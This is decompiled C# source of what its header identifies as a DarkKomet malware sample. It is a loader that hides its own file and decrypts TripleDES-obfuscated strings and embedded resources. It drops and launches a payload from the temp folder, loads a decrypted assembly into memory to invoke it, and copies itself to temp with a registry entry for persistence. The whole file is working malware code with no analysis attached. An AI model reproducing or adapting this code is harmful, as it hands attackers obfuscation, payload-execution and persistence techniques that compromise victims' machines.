// Decompiled with JetBrains decompiler
// Type: OkGekgsv
// Assembly: test, Version=5.7.5.2, Culture=neutral, PublicKeyToken=null
// MVID: EF65CEBE-E5DD-4DC6-AA73-3D4CA5A9F00A
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\HackTool.Win32.DarkKomet.a-cbd275fc64689591d403dfa551f4f6864d957360c1f9d1343675619fe069bd62.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

public class OkGekgsv
{
  public static string WqKEtZiihm(string NNLQnuCgss, string wimMmxrKHd)
  {
    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
    MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
    cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(wimMmxrKHd));
    cryptoServiceProvider1.Mode = CipherMode.ECB;
    ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
    byte[] inputBuffer = Convert.FromBase64String(NNLQnuCgss);
    return Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
  }

  public static byte[] XQXCPOehkc(byte[] NNLQnuCgss, string wimMmxrKHd)
  {
    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
    MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
    cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(wimMmxrKHd));
    cryptoServiceProvider1.Mode = CipherMode.ECB;
    ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
    byte[] inputBuffer = NNLQnuCgss;
    return decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
  }

  [STAThread]
  public static void Main()
  {
    string fullyQualifiedName = Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName;
    try
    {
      File.SetAttributes(fullyQualifiedName, FileAttributes.Hidden | FileAttributes.System);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Thread.Sleep(0);
    ResourceManager resourceManager = new ResourceManager("nGrvV", Assembly.GetExecutingAssembly());
    if (!File.Exists(Path.GetTempPath() + "\\" + OkGekgsv.WqKEtZiihm("uONoNXUtoc2RZsivnycGEQ==", "gORlOSgc")))
    {
      try
      {
        byte[] array = (byte[]) resourceManager.GetObject("MZyyaiuX");
        FileStream fileStream = new FileStream(Path.GetTempPath() + "\\" + OkGekgsv.WqKEtZiihm("uONoNXUtoc2RZsivnycGEQ==", "gORlOSgc"), FileMode.Append);
        fileStream.Write(array, 0, array.Length);
        fileStream.Close();
      }
      catch (IOException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
      Process.Start(Path.GetTempPath() + "\\" + OkGekgsv.WqKEtZiihm("uONoNXUtoc2RZsivnycGEQ==", "gORlOSgc"));
    }
    byte[] rawAssembly = OkGekgsv.XQXCPOehkc((byte[]) resourceManager.GetObject("PdlmvUOr"), "CRVYQoEw");
    byte[] numArray = OkGekgsv.XQXCPOehkc(Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject("jTpZkplx"))), "WUZwELpC");
    Assembly.Load(rawAssembly).GetType(OkGekgsv.WqKEtZiihm("u2fYBublErM=", "ejrhNV")).GetMethod(OkGekgsv.WqKEtZiihm("dqVnMQEYomg=", "fDxbdK")).Invoke((object) null, new object[2]
    {
      (object) numArray,
      (object) (Environment.GetEnvironmentVariable(OkGekgsv.WqKEtZiihm("jdL5nU3UBC8=", "VDrMDtHSBz")) + OkGekgsv.WqKEtZiihm("IZtPxKQGWtxGjxKabtxJcR6r/zWQmwT6fVsuHufDaMl3mEq2+mwceGatZz25onF2", "nnPXjMfLiB"))
    });
    try
    {
      if (Operators.CompareString(fullyQualifiedName, Path.GetTempPath() + OkGekgsv.WqKEtZiihm("XKrvHBJHs9rjZEemr2hBZA==", "njjhmY"), false) == 0)
        return;
      File.Copy(fullyQualifiedName, Path.GetTempPath() + OkGekgsv.WqKEtZiihm("XKrvHBJHs9rjZEemr2hBZA==", "njjhmY"), true);
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(OkGekgsv.WqKEtZiihm("Y1OiLLgEgp0aqW1r8uwpljq6XN7YpSEAyQ/K7yOJUPki/mMewFoGQrBd3jKy6MlE", "FkrLTI"), true);
      registryKey.SetValue(OkGekgsv.WqKEtZiihm("4szNZDFjTfj/ACtIRYvMuQ==", "elDdcs"), (object) (Path.GetTempPath() + OkGekgsv.WqKEtZiihm("XKrvHBJHs9rjZEemr2hBZA==", "njjhmY")), RegistryValueKind.String);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
